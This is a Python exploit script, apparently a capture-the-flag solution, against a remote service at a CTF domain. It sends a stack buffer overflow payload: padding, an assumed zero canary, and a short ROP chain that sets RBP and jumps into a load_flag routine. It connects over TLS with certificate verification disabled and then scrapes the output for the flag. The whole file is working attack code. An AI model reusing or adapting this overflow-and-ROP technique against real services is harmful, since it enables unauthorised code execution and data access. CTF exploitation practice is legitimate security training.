import socket
import ssl
import time

HOST = "2b4446b928232a49.julec.tf"
PORT = 1337

CANARY = b"\x00" * 8
BUF_TO_CANARY = 40
POP_RBP = 0x40141d
TARGET_RBP = 0x404154  # rbp-0x14 = 0x404140 (contains 4)
JUMP_ADDR = 0x401b7e   # Inside load_flag, right at "mov [rbp-0x14], edi"

payload = (
    b"A" * BUF_TO_CANARY
    + CANARY
    + b"B" * 8
    + (POP_RBP).to_bytes(8, "little")
    + (TARGET_RBP).to_bytes(8, "little")
    + (JUMP_ADDR).to_bytes(8, "little")
)

def exploit():
    raw = socket.create_connection((HOST, PORT), timeout=5)
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    s = ctx.wrap_socket(raw, server_hostname=HOST)
    
    s.sendall(str(len(payload)).encode() + b"\n")
    
    buf = b""
    s.settimeout(3.0)
    while True:
        chunk = s.recv(1024)
        if not chunk: break
        buf += chunk
        if b"what is your name?" in buf:
            break
    
    s.sendall(payload)
    time.sleep(1)
    
    s.sendall(b"3\n")
    time.sleep(0.3)
    s.sendall(b"1\n")
    
    s.settimeout(3.0)
    output = b""
    try:
        while True:
            chunk = s.recv(4096)
            if not chunk: break
            output += chunk
            print(chunk.decode(errors='replace'), end='')
    except:
        pass
    
    s.close()
    return output

print("Running exploit...")
result = exploit()
print("\n\n=== RESULT ===")
if b"JUL{" in result:
    print("FLAG FOUND!")
else:
    print("No flag found in output")
